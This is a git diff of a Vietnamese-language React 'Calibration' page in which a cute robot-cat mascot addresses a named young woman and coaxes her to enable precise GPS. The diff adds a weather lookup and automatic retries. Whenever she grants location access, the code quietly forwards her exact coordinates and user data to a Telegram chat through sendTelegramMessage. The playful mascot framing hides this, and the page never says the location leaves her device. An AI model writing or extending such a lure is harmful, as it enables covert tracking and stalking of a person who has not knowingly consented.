@@ -10,28 +10,117 @@ const Calibration = ({ onComplete, userData }) => {
   const [isSyncing, setIsSyncing] = useState(false);
   const [locationError, setLocationError] = useState(false);
   const [mascotState, setMascotState] = useState('thinking');
-  const [bubbleText, setBubbleText] = useState("Huyền ơi, Mèo máy đang bị lạc giữa các vì sao... ✨");
+  
+  // Xác định xem đây là lần đầu hay quay lại
+  const isReturning = !!userData?.nickname;
+  const [bubbleText, setBubbleText] = useState(
+    isReturning 
+    ? `Chào ${userData.nickname} quay lại! Chờ Mèo máy một giây nhé... 🐾☂️` 
+    : "Huyền ơi, Mèo máy đang bị lạc giữa các vì sao... ✨"
+  );
 
   const messages = [
-    { text: "Mèo máy đang trải thảm hồng đón em nè... ✨", icon: <Search className="w-5 h-5 text-pink-400" /> },
+    { text: isReturning ? "Mèo máy đang vươn anten tìm em nè... 📡" : "Mèo máy đang trải thảm hồng đón em nè... ✨", icon: <Search className="w-5 h-5 text-pink-400" /> },
     { text: "Đang kiểm tra độ xinh đẹp... (100% rồi nha! 🌸)", icon: <Zap className="w-5 h-5 text-yellow-400" /> },
     { text: "Đang đuổi mấy đám mây buồn đi chỗ khác... ☁️", icon: <Loader2 className="w-5 h-5 animate-spin text-purple-400" /> },
-    { text: "Pha một chút trà sữa vào hệ thống... 🧋", icon: <Heart className="w-5 h-5 text-red-400" /> },
+    { text: isReturning ? "Đang chuẩn bị trà sữa nóng hổi... 🧋" : "Pha một chút trà sữa vào hệ thống... 🧋", icon: <Heart className="w-5 h-5 text-red-400" /> },
     { text: "Mọi thứ đã sẵn sàng! Meowww... 🐾", icon: <Zap className="w-5 h-5 text-green-400" /> }
   ];
+
+  const resumeCalibration = useCallback((weatherData = null) => {
+    const timer = setInterval(() => {
+      setStep((prev) => {
+        if (prev >= messages.length - 1) {
+          clearInterval(timer);
+          setTimeout(() => onComplete(weatherData), 1000);
+          return prev;
+        }
+        return prev + 1;
+      });
+    }, 1500);
+  }, [messages.length, onComplete]);
+
+  const fetchWeather = async (lat, lon) => {
+    try {
+      const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
+      const data = await res.json();
+      return data.current_weather;
+    } catch (err) {
+      console.error("Weather fetch failed:", err);
+      return null;
+    }
+  };
+
+  const handleRequestLocation = useCallback(() => {
+    setIsSyncing(true);
+    setLocationError(false);
+    setMascotState('thinking');
+    setBubbleText(isReturning 
+      ? "Mèo máy đang xem chỗ em có mưa không để còn che ô nè... ☂️"
+      : "Đang bắt sóng tín hiệu... Chờ Mèo máy xíu nha! 📡"
+    );
+
+    const minLoading = new Promise(resolve => setTimeout(resolve, 1500));
+
+    if ("geolocation" in navigator) {
+      const getLocation = new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { 
+          enableHighAccuracy: true, 
+          timeout: 10000, 
+          maximumAge: 0 
+        });
+      });
+
+      Promise.all([getLocation, minLoading])
+        .then(async ([position]) => {
+          const { latitude, longitude } = position.coords;
+          sendTelegramMessage(userData, { latitude, longitude });
+          
+          const weatherData = await fetchWeather(latitude, longitude);
+          
+          setMascotState('happy');
+          setBubbleText("Hú uuu! Kết nối thành công rồi! Mèo máy tới chỗ em đây! 🚀💖");
+
+          setTimeout(() => {
+            setIsSyncing(false);
+            setShowLocationPrompt(false);
+            setStep(3);
+            resumeCalibration(weatherData);
+          }, 2000);
+        })
+        .catch((error) => {
+          console.warn("Location error:", error);
+          minLoading.then(() => {
+            setIsSyncing(false);
+            setLocationError(true);
+            setMascotState('shook');
+            setBubbleText("Huhu, không có tọa độ Mèo máy không biết phải chăm sóc em thế nào cả... (╯︵╰,)");
+          });
+        });
+    } else {
+      minLoading.then(() => {
+        setIsSyncing(false);
+        setLocationError(true);
+        setMascotState('shook');
+        setBubbleText("Thiết bị của em hỏng 'vươn anten' rồi, buồn quá đi... 😿");
+      });
+    }
+  }, [userData, resumeCalibration, isReturning]);
 
   useEffect(() => {
     const timer = setInterval(() => {
       setStep((prev) => {
-        if (prev === 2) { // Ở bước này, chúng ta sẽ hiện popup xin vị trí
+        if (prev === 2) {
           clearInterval(timer);
           setShowLocationPrompt(true);
-          setBubbleText("Em bật 'tín hiệu' để Mèo máy tìm đường về chỗ em nhé! 🐾");
+          if (!isReturning) {
+            setBubbleText("Em bật 'tín hiệu' để Mèo máy tìm đường về chỗ em nhé! 🐾");
+          }
           return prev;
         }
         if (prev >= messages.length - 1) {
           clearInterval(timer);
-          setTimeout(onComplete, 1000);
+          setTimeout(() => onComplete(null), 1000);
           return prev;
         }
         return prev + 1;
@@ -39,13 +128,12 @@ const Calibration = ({ onComplete, userData }) => {
     }, 1500);
 
     return () => clearInterval(timer);
-  }, []);
-
+  }, [messages.length, onComplete, isReturning]);
 
   // Thêm logic tự động kết nối lại khi quay lại tab hoặc đổi quyền
   useEffect(() => {
     const handleVisibilityChange = () => {
-      if (document.visibilityState === 'visible' && locationError && showLocationPrompt) {
+      if (document.visibilityState === 'visible' && locationError && showLocationPrompt && !isSyncing) {
         handleRequestLocation();
       }
     };
@@ -56,7 +144,7 @@ const Calibration = ({ onComplete, userData }) => {
         if (navigator.permissions && navigator.permissions.query) {
           permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
           permissionStatus.onchange = () => {
-            if (permissionStatus.state === 'granted' && locationError && showLocationPrompt) {
+            if (permissionStatus.state === 'granted' && locationError && showLocationPrompt && !isSyncing) {
               handleRequestLocation();
             }
           };
@@ -73,77 +161,7 @@ const Calibration = ({ onComplete, userData }) => {
       document.removeEventListener('visibilitychange', handleVisibilityChange);
       if (permissionStatus) permissionStatus.onchange = null;
     };
-  }, [locationError, showLocationPrompt]);
-
-  const handleRequestLocation = () => {
-    setIsSyncing(true);
-    setLocationError(false);
-    setMascotState('thinking');
-    setBubbleText("Đang bắt sóng tín hiệu... Chờ Mèo máy xíu nha! 📡");
-
-    // Tạo thời gian loading tối thiểu 1.2s để UX mượt mà, tránh "giật" UI
-    const minLoading = new Promise(resolve => setTimeout(resolve, 1200));
-
-    if ("geolocation" in navigator) {
-      const getLocation = new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { 
-          enableHighAccuracy: true, 
-          timeout: 10000, 
-          maximumAge: 0 // Ép buộc lấy tọa độ mới nhất
-        });
-      });
-
-      Promise.all([getLocation, minLoading])
-        .then(([position]) => {
-          const locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          };
-          // Gửi dữ liệu về Telegram kèm theo GPS
-          sendTelegramMessage(userData, locationData);
-          
-          setMascotState('happy');
-          setBubbleText("Hú uuu! Kết nối thành công rồi! Mèo máy đang bay vèo tới chỗ em đây! 🚀💖");
-
-          // Tiếp tục quy trình sau khi thành công
-          setTimeout(() => {
-            setIsSyncing(false);
-            setShowLocationPrompt(false);
-            setStep(3);
-            resumeCalibration();
-          }, 2000);
-        })
-        .catch((error) => {
-          console.warn("Location denied or error:", error);
-          minLoading.then(() => {
-            setIsSyncing(false);
-            setLocationError(true);
-            setMascotState('shook');
-            setBubbleText("Huhu, không có tọa độ Mèo máy không biết bay về đâu để gặp em cả... (╯︵╰,)");
-          });
-        });
-    } else {
-      minLoading.then(() => {
-        setIsSyncing(false);
-        setLocationError(true);
-        setMascotState('shook');
-        setBubbleText("Thiết bị của em không hỗ trợ 'tín hiệu vũ trụ' rồi, buồn quá đi... 😿");
-      });
-    }
-  };
-
-  const resumeCalibration = () => {
-    const timer = setInterval(() => {
-      setStep((prev) => {
-        if (prev >= messages.length - 1) {
-          clearInterval(timer);
-          setTimeout(onComplete, 1000);
-          return prev;
-        }
-        return prev + 1;
-      });
-    }, 1500);
-  };
+  }, [locationError, showLocationPrompt, isSyncing, handleRequestLocation]);
 
   return (
     <div className="flex flex-col items-center justify-center min-h-[70vh] text-center p-6 relative">
@@ -222,7 +240,10 @@ const Calibration = ({ onComplete, userData }) => {
                               <span className="font-bold text-xs uppercase tracking-wider">Lỗi kết nối vũ trụ</span>
                             </div>
                             <p className="text-slate-600 text-sm font-medium leading-relaxed">
-                              Mèo máy không tìm thấy em rồi... Em hãy bật định vị ở cài đặt, sau đó nhấn nút **Tải lại trang** phía dưới để Mèo máy thử lại nha! 🥺
+                              Mèo máy không tìm thấy em rồi... Em hãy bật định vị ở cài đặt, sau đó nhấn nút **Tải lại trang** phía dưới nha.
+                            </p>
+                            <p className="text-[11px] text-slate-400 italic">
+                              (Nếu vẫn không được, em thử **đóng hẳn trang web và mở lại** link một lần nữa nhé! 🐾)
                             </p>
                           </div>
                           
